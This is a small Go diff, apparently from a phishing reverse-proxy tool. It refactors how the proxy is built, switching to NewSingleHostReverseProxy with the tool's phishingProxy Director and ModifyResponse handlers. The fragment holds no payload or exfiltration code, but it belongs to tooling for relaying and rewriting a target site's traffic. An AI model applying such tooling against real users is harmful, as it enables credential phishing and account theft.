@@ -115,11 +115,10 @@ func New(config *Config) *ProxyServer {
 		Logger:               config.Logger,
 	}
 
-	reverseProxy := &httputil.ReverseProxy{
-		Director:       phishingProxy.Director,
-		ModifyResponse: phishingProxy.ModifyResponse,
-		Transport:      config.Transport,
-	}
+	reverseProxy := httputil.NewSingleHostReverseProxy(config.TargetURL)
+	reverseProxy.Director = phishingProxy.Director
+	reverseProxy.ModifyResponse = phishingProxy.ModifyResponse
+	reverseProxy.Transport = config.Transport
 
 	return &ProxyServer{
 		reverseProxy: reverseProxy,
